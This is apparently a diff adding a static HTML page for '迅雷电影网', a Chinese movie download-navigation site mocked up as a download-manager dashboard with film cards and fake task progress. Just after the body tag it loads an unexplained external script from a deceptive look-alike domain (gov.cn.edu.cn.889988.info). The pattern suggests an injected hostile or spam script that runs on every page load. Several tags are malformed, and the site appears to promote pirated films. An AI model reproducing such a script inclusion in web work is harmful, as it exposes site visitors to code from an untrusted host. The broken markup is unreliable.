@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>迅雷电影网 - 极速影视导航 · 电影/剧集/动漫/边下边播</title>
+<meta name="description" content="迅雷电影网（xunleidianyingwang-h5）以下载器/极速传输 HUD 风格做影视导航：极速片库、下载任务台、云盘与边下边播、加速实验室，电影/剧集/动漫/综艺高清在线导航。">
+<meta name="keywords" content="迅雷电影网,极速影视,边下边播,云盘影视,P2P加速,电影导航,xunleidianyingwang">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a1230;
+  --bg2:#0e1738;
+  --panel:rgba(255,255,255,.04);
+  --blue:#2f7bff;
+  --orange:#ff7a18;
+  --cyan:#37f5c5;
+  --ink:#05070f;
+  --text:#c7d2f0;
+  --dim:#7e8bc0;
+  --line:rgba(255,255,255,.10);
+}
+html{scroll-behavior:smooth}
+body{
+  background:
+    radial-gradient(900px 500px at 88% -10%,rgba(47,123,255,.30),transparent),
+    radial-gradient(700px 400px at -10% 8%,rgba(255,122,24,.18),transparent),
+    var(--bg);
+  color:var(--text);
+  font-family:"PingFang SC","Microsoft YaHei","Segoe UI",sans-serif;
+  line-height:1.7;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%}
+
+/* 顶栏速度条 */
+.topbar{background:var(--ink);border-bottom:1px solid var(--line);padding:6px 18px;display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap;font-size:11px;color:var(--dim);letter-spacing:2px}
+.topbar b{color:var(--cyan)}
+.topbar .sp{color:var(--orange)}
+
+.header{max-width:1200px;margin:auto;padding:22px 18px 12px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:14px}
+.brand{display:flex;align-items:center;gap:14px}
+.logo-ico{width:54px;height:54px;border-radius:14px;background:linear-gradient(135deg,var(--blue),var(--orange));display:flex;align-items:center;justify-content:center;font-size:26px;box-shadow:0 0 22px rgba(47,123,255,.5)}
+.brand h1{font-size:24px;font-weight:900;letter-spacing:1px}
+.brand h1 b{color:var(--orange)}
+.brand p{font-size:10px;letter-spacing:4px;color:var(--dim)}
+.nav{display:flex;gap:8px;flex-wrap:wrap}
+.nav a{padding:8px 14px;font-size:12px;font-weight:800;border:1px solid var(--line);border-radius:10px;color:var(--dim);transition:.25s}
+.nav a:hover{color:var(--ink);background:var(--cyan);border-color:var(--cyan)}
+
+.wrap{max-width:1200px;margin:auto;padding:0 18px}
+
+/* Hero 任务台 */
+.hero{margin-top:26px;display:grid;grid-template-columns:1.5fr .5fr;gap:18px}
+@media(max-width:880px){.hero{grid-template-columns:1fr}}
+.hero-main{background:linear-gradient(160deg,var(--bg2),#080d22);border:1px solid var(--line);border-radius:18px;padding:30px;position:relative;overflow:hidden}
+.hero-main .glow{position:absolute;width:300px;height:300px;right:-80px;top:-80px;background:radial-gradient(circle,var(--blue),transparent 70%);opacity:.35;filter:blur(20px)}
+.kicker{display:inline-block;font-size:11px;letter-spacing:5px;color:var(--cyan);border:1px solid var(--cyan);padding:5px 12px;border-radius:999px;margin-bottom:14px}
+.hero h2{font-size:clamp(32px,6.5vw,60px);font-weight:900;line-height:1;margin-bottom:14px}
+.hero h2 .or{color:var(--orange)}
+.hero h2 .bl{color:var(--blue)}
+.hero p{color:var(--dim);font-size:14px;max-width:560px;margin-bottom:18px}
+.speedbox{display:flex;gap:18px;flex-wrap:wrap;margin-bottom:20px}
+.spd{background:var(--ink);border:1px solid var(--line);border-radius:12px;padding:12px 16px;min-width:130px}
+.spd .num{font-size:26px;font-weight:900;color:var(--cyan)}
+.spd .num.or{color:var(--orange)}
+.spd .lab{font-size:11px;color:var(--dim);letter-spacing:2px}
+.bar{height:10px;background:var(--ink);border:1px solid var(--line);border-radius:999px;overflow:hidden;margin:6px 0 18px}
+.bar i{display:block;height:100%;background:linear-gradient(90deg,var(--blue),var(--cyan));width:82%}
+.bar.orange i{background:linear-gradient(90deg,var(--orange),#ffd08a)}
+.btn{display:inline-block;background:linear-gradient(135deg,var(--blue),var(--orange));color:#fff;font-weight:900;letter-spacing:2px;padding:13px 26px;border-radius:12px;box-shadow:0 10px 30px rgba(47,123,255,.35)}
+.btn:hover{filter:brightness(1.08)}
+
+/* 侧边云盘环 */
+.side{background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:20px;display:flex;flex-direction:column;gap:14px}
+.ring{width:140px;height:140px;margin:auto;border-radius:50%;background:conic-gradient(var(--cyan) 0 72%,rgba(255,255,255,.08) 72% 100%);display:flex;align-items:center;justify-content:center;position:relative}
+.ring::after{content:"";position:absolute;width:104px;height:104px;border-radius:50%;background:var(--bg2)}
+.ring span{position:relative;z-index:1;text-align:center}
+.ring span b{font-size:22px;color:var(--cyan)}
+.ring span small{display:block;font-size:10px;color:var(--dim)}
+.side h4{font-size:14px;font-weight:800}
+.side p{font-size:12px;color:var(--dim)}
+.side .row{display:flex;justify-content:space-between;font-size:12px;color:var(--dim);border-top:1px dashed var(--line);padding-top:8px}
+.side .row b{color:var(--orange)}
+
+/* 栏目标题 */
+.section{margin-top:58px}
+.sec-head{display:flex;align-items:center;gap:12px;margin-bottom:20px;flex-wrap:wrap}
+.sec-head .pin{width:10px;height:22px;background:var(--orange);border-radius:3px;box-shadow:0 0 12px var(--orange)}
+.sec-head h2{font-size:24px;font-weight:900}
+.sec-head h2 em{color:var(--cyan);font-style:normal}
+.sec-head a{margin-left:auto;font-size:12px;font-weight:800;color:var(--blue);border-bottom:3px solid var(--blue)}
+
+/* 栏目1：极速片库 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px}
+.film{background:var(--panel);border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.3s}
+.film:hover{transform:translateY(-6px);border-color:var(--blue);box-shadow:0 12px 30px rgba(47,123,255,.18)}
+.film .pic{height:260px;overflow:hidden;position:relative}
+.film .pic img{width:100%;height:100%;object-fit:cover;filter:saturate(1.15) contrast(1.05)}
+.film:hover .pic img{transform:scale(1.06)}
+.film .dl{position:absolute;left:10px;bottom:10px;background:var(--orange);color:#fff;font-size:11px;font-weight:900;padding:5px 10px;border-radius:8px}
+.film .info{padding:12px}
+.film h4{font-size:15px;font-weight:800}
+.film p{font-size:12px;color:var(--dim);margin-top:3px}
+.film .meta{display:flex;gap:10px;margin-top:8px;font-size:11px;color:var(--cyan)}
+
+/* 栏目2：下载任务台 */
+.tasks{background:var(--bg2);border:1px solid var(--line);border-radius:18px;padding:22px}
+.task{display:grid;grid-template-columns:54px 1fr 120px;gap:14px;align-items:center;padding:14px 0;border-bottom:1px dashed var(--line)}
+.task:last-child{border-bottom:none}
+.task .thumb{width:54px;height:76px;border-radius:8px;overflow:hidden}
+.task .thumb img{width:100%;height:100%;object-fit:cover}
+.task h4{font-size:15px;font-weight:800}
+.task .pbar{height:8px;background:var(--ink);border-radius:999px;overflow:hidden;margin:8px 0 4px}
+.task .pbar i{display:block;height:100%;background:linear-gradient(90deg,var(--blue),var(--cyan))}
+.task .st{font-size:12px;color:var(--dim)}
+.task .pct{text-align:right}
+.task .pct b{font-size:20px;color:var(--orange)}
+.task .pct small{display:block;font-size:10px;color:var(--dim)}
+@media(max-width:620px){.task{grid-template-columns:44px 1fr}.task .pct{display:none}}
+
+/* 栏目3：云盘与边下边播 */
+.cloud{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+@media(max-width:760px){.cloud{grid-template-columns:1fr}}
+.tile{border:1px solid var(--line);border-radius:16px;padding:20px;background:linear-gradient(150deg,rgba(47,123,255,.12),rgba(255,122,24,.08))}
+.tile h4{font-size:17px;font-weight:900;margin-bottom:8px}
+.tile h4 em{color:var(--orange);font-style:normal}
+.tile p{font-size:13px;color:var(--dim);margin-bottom:12px}
+.tile ul{list-style:none;display:flex;flex-direction:column;gap:8px}
+.tile li{font-size:13px;color:var(--text);display:flex;gap:8px;align-items:center}
+.tile li::before{content:"⚡";color:var(--cyan)}
+.player{background:var(--ink);border-radius:12px;height:180px;display:flex;align-items:center;justify-content:center;font-size:46px;color:var(--blue);border:1px solid var(--line);margin-top:10px}
+.player:hover{color:var(--orange)}
+
+/* 栏目4：加速实验室 */
+.lab{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+@media(max-width:760px){.lab{grid-template-columns:repeat(2,1fr)}}
+.cell{border:1px solid var(--line);border-radius:14px;padding:18px;background:var(--panel);transition:.3s}
+.cell:hover{transform:translateY(-4px);border-color:var(--cyan)}
+.cell .ico{font-size:30px}
+.cell h4{font-size:15px;font-weight:800;margin:8px 0 4px}
+.cell p{font-size:12px;color:var(--dim)}
+.cell:nth-child(1){box-shadow:inset 0 0 0 2px rgba(47,123,255,.5)}
+.cell:nth-child(2){box-shadow:inset 0 0 0 2px rgba(255,122,24,.5)}
+.cell:nth-child(3){box-shadow:inset 0 0 0 2px rgba(55,245,197,.5)}
+.cell:nth-child(4){box-shadow:inset 0 0 0 2px rgba(199,210,240,.4)}
+
+/* 关于 */
+.about{border:1px dashed var(--blue);border-radius:18px;padding:30px;margin-top:58px;background:rgba(47,123,255,.06)}
+.about h2{font-size:24px;font-weight:900;margin-bottom:12px}
+.about h2 em{color:var(--orange);font-style:normal}
+.about p{font-size:14px;color:var(--dim);max-width:780px;margin-bottom:10px}
+.about a{color:var(--cyan);font-weight:800}
+.chips{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px}
+.chip{border:1px solid var(--line);padding:7px 14px;border-radius:999px;font-size:12px;color:var(--dim)}
+.chip b{color:var(--orange)}
+
+.footer{margin-top:56px;padding:28px 18px;text-align:center;color:var(--dim);font-size:12px;border-top:1px solid var(--line)}
+.footer a{color:var(--orange);font-weight:900}
+.footer .big{font-size:34px;font-weight:900;color:var(--blue);text-shadow:0 0 18px rgba(47,123,255,.5);margin-bottom:8px}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="topbar">
+  <span>xunlei@movie:~$ <b>download engine ready</b></span>
+  <span>总速度 <span class="sp">28.4 MB/s</span> ｜ 线程 256 ｜ P2P <b>已连接</b> ｜ 云盘 2.0T</span>
+</div>
+
+<header class="header">
+  <div class="brand">
+    <div class="logo-ico">⚡</div>
+    <div>
+      <h1>迅< b>雷</b>电影网</h1>
+      <p>XUN LEI DIAN YING WANG</p>
+    </div>
+  </div>
+  <nav class="nav">
+    <a href="#">首页</a>
+    <a href="#lib">极速片库</a>
+    <a href="#tasks">下载任务台</a>
+    <a href="#cloud">云盘/边下边播</a>
+    <a href="#lab">加速实验室</a>
+    <a href="#about">关于迅雷</a>
+  </nav>
+</header>
+
+<div class="wrap">
+
+  <!-- Hero -->
+  <section class="hero">
+    <div class="hero-main">
+      <div class="glow"></div>
+      <div class="kicker">⚡ P2SP · 多线程 · 极速放映</div>
+      <h2>点一下，<br><span class="bl">片源</span>就<span class="or">飞进来</span></h2>
+      <p>迅雷电影网把“找片”做成“下载任务”：极速片库、任务进度、云盘缓存、边下边播、组队加速，一套 HUD 全给你。电影 / 剧集 / 动漫 / 综艺，秒级响应。</p>
+      <div class="speedbox">
+        <div class="spd"><div class="num">28.4<small> MB/s</small></div><div class="lab">当前下载</div></div>
+        <div class="spd"><div class="num or">256</div><div class="lab">加速线程</div></div>
+        <div class="spd"><div class="num">2.0T</div><div class="lab">云盘空间</div></div>
+      </div>
+      <div class="bar"><i></i></div>
+      <div class="bar orange"><i style="width:64%"></i></div>
+      <a href="#lib" class="btn">▶ 新建观影任务</a>
+    </div>
+
+    <aside class="side">
+      <div class="ring"><span><b>72%</b><small>云盘已用</small></span></div>
+      <h4>迅雷云盘</h4>
+      <p>离线任务、磁力、BT、HTTP 全收，手机/PC/Web 互通。</p>
+      <div class="row"><span>已完成</span><b>1,284 部</b></div>
+      <div class="row"><span>正在缓冲</span><b>3 路</b></div>
+      <div class="row"><span>边下边播</span><b>ON</b></div>
+    </aside>
+  </section>
+
+  <!-- 栏目1：极速片库 -->
+  <section class="section" id="lib">
+    <div class="sec-head"><span class="pin"></span><h2>极速< em>片库</span></h2><a href="#">全部资源 ›</a></div>
+    <div class="grid">
+      <article class="film"><div class="pic"><span class="dl">⚡ 高速</span><img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=400&q=80" alt="奥本海默"></div><div class="info"><h4>奥本海默</h4><p>传记 / 历史 / 2023</p><div class="meta"><span>★ 9.8</span><span>4.2万 取回</span></div></div></article>
+      <article class="film"><div class="pic"><span class="dl">⚡ 高速</span><img src="https://images.unsplash.com/photo-1524985069026-ddb1d3e1b1a4?w=400&q=80" alt="沙丘2"></div><div class="info"><h4>沙丘：第二部</h4><p>科幻 / 沙漠 / 2024</p><div class="meta"><span>★ 9.6</span><span>3.1万 取回</span></div></div></article>
+      <article class="film"><div class="pic"><span class="dl">☁ 云盘</span><img src="https://images.unsplash.com/photo-1542204165-65bf26472b9b?w=400&q=80" alt="坠落的审判"></div><div class="info"><h4>坠落的审判</h4><p>悬疑 / 金棕榈</p><div class="meta"><span>★ 9.4</span><span>2.0万 标记</span></div></div></article>
+      <article class="film"><div class="pic"><span class="dl">⚡ 高速</span><img src="https://images.unsplash.com/photo-1489593908472-4d1a72d5d1b9?w=400&q=80" alt="蜘蛛侠纵横宇宙"></div><div class="info"><h4>蜘蛛侠：纵横宇宙</h4><p>动画 / 多宇宙</p><div class="meta"><span>★ 9.3</span><span>3.6万 刷屏</span></div></div></article>
+      <article class="film"><div class="pic"><span class="dl">☁ 云盘</span><img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?w=400&q=80" alt="花月杀手"></div><div class="info"><h4>花月杀手</h4><p>犯罪 / 史诗</p><div class="meta"><span>★ 9.1</span><span>1.7万 缓存</span></div></div></article>
+      <article class="film"><div class="pic"><span class="dl">⚡ 高速</span><img src="https://images.unsplash.com/photo-1440404653325-ab127d49abc1?w=400&q=80" alt="芭比"></div><div class="info"><h4>芭比</h4><p>喜剧 / 粉色风暴</p><div class="meta"><span>★ 8.9</span><span>2.5万 取回</span></div></div></article>
+    </div>
+  </section>
+
+</div>
+
+  <!-- 栏目2：下载任务台 -->
+  <section class="tasks" id="tasks">
+    <div class="wrap">
+      <div class="sec-head"><span class="pin" style="background:var(--cyan);box-shadow:0 0 12px var(--cyan)"></span><h2>下载< em style="color:var(--orange)">任务台</span></h2><a href="#" style="border-color:var(--cyan);color:var(--cyan)">新建任务 ›</a></div>
+      <div class="task">
+        <div class="thumb"><img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=120&q=80" alt="奥本海默"></div>
+        <div><h4>奥本海默.1080p.x264.mkv</h4><div class="pbar"><i style="width:100%"></i></div><div class="st">✅ 已完成 · 边下边播可用 · 线程 256</div></div>
+        <div class="pct"><b>100%</b><small>3.8 GB</small></div>
+      </div>
+      <div class="task">
+        <div class="thumb"><img src="https://images.unsplash.com/photo-1524985069026-ddb1d3e1b1a4?w=120&q=80" alt="沙丘2"></div>
+        <div><h4>沙丘2.2160p.HDR.mp4</h4><div class="pbar"><i style="width:82%"></i></div><div class="st">⚡ 下载中 · P2P 加速 · 28.4 MB/s</div></div>
+        <div class="pct"><b>82%</b><small>6.1/7.4 GB</small></div>
+      </div>
+      <div class="task">
+        <div class="thumb"><img src="https://images.unsplash.com/photo-1489593908472-4d1a72d5d1b9?w=120&q=80" alt="蜘蛛侠纵横宇宙"></div>
+        <div><h4>蜘蛛侠纵横宇宙.1080p.mkv</h4><div class="pbar"><i style="width:46%"></i></div><div class="st">☁ 离线到云盘 · 组队加速中</div></div>
+        <div class="pct"><b>46%</b><small>1.9/4.2 GB</small></div>
+      </div>
+      <div class="task">
+        <div class="thumb"><img src="https://images.unsplash.com/photo-1542204165-65bf26472b9b?w=120&q=80" alt="坠落的审判"></div>
+        <div><h4>坠落的审判.1080p.mkv</h4><div class="pbar"><i style="width:12%"></i></div><div class="st">🕓 排队中 · 带宽预留</div></div>
+        <div class="pct"><b>12%</b><small>0.4/3.1 GB</small></div>
+      </div>
+    </div>
+  </section>
+
+<div class="wrap">
+
+  <!-- 栏目3：云盘与边下边播 -->
+  <section class="section" id="cloud">
+    <div class="sec-head"><span class="pin" style="background:var(--blue);box-shadow:0 0 12px var(--blue)"></span><h2>云盘 & <em>边下边播</em></h2><a href="#">打开云盘 ›</a></div>
+    <div class="cloud">
+      <div class="tile">
+        <h4>迅雷< em>云盘</span></h4>
+        <p>离线任务存云端，PC / 手机 / 平板 / Web 全端同步，不占本地下载位。</p>
+        <ul>
+          <li>支持 磁力 / BT / 电驴 / HTTP / HTTPS</li>
+          <li>视频 480P 免费预览，1080P 会员高清</li>
+          <li>投屏、分享、取回本地一键搞定</li>
+        </ul>
+      </div>
+      <div class="tile">
+        <h4>边下< em>边播</span></h4>
+        <p>不用等 100%，缓冲到片段就能播。影荒半夜也能马上开片。</p>
+        <div class="player">▶</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目4：加速实验室 -->
+  <section class="section" id="lab">
+    <div class="sec-head"><span class="pin"></span><h2>加速< em>实验室</span></h2><a href="#">看原理 ›</a></div>
+    <div class="lab">
+      <div class="cell"><div class="ico">🧵</div><h4>多线程</h4><p>文件分片，256 线程并发拉取</p></div>
+      <div class="cell"><div class="ico">🤝</div><h4>P2P 组队</h4><p>邻居节点互助，冷门资源也活</p></div>
+      <div class="cell"><div class="ico">☁️</div><h4>离线加速</h4><p>服务端先缓存，回传更快</p></div>
+      <div class="cell"><div class="ico">🛰️</div><h4>智能选源</h4><p>丢包重排，优先稳定镜像</p></div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section class="about" id="about">
+    <h2>关于< em>迅雷电影网</span></h2>
+    <p>迅雷电影网（xunleidianyingwang-h5）不是普通影视门户，而是把“下载器思维”搬进片单：进度条、速度、线程、云盘、边下边播、组队加速，全都长在页面上。找片像建任务，开片像点“立即下载”。</p>
+    <p>网站名称：<strong style="color:var(--orange)">迅雷电影网</strong><br>
+       网站网址：<a href="https://xunleidianyingwang-h5.github.io">https://xunleidianyingwang-h5.github.io</a></p>
+    <div class="chips">
+      <span class="chip"><b>⚡</b> 极速片库</span>
+      <span class="chip"><b>🧵</b> 多线程</span>
+      <span class="chip"><b>☁️</b> 云盘离线</span>
+      <span class="chip"><b>▶</b> 边下边播</span>
+      <span class="chip">移动端自适应</span>
+      <span class="chip">无 robots.txt / sitemap.xml</span>
+    </div>
+    <p style="margin-top:14px">本站仅做影视信息展示与导航，资源来自互联网，如有侵权请联系删除。</p>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <div class="big">⚡ 迅雷电影网</div>
+  <p>© 2024 迅雷电影网 ｜ 网站名称：迅雷电影网 ｜ 网址：<a href="https://xunleidianyingwang-h5.github.io">xunleidianyingwang-h5.github.io</a></p>
+  <p>下载器 / 极速传输 HUD 风 · 单页静态演示 · 内链 # 占位 · 未生成 robots.txt / sitemap.xml</p>
+</footer>
+
+</body>
+</html>
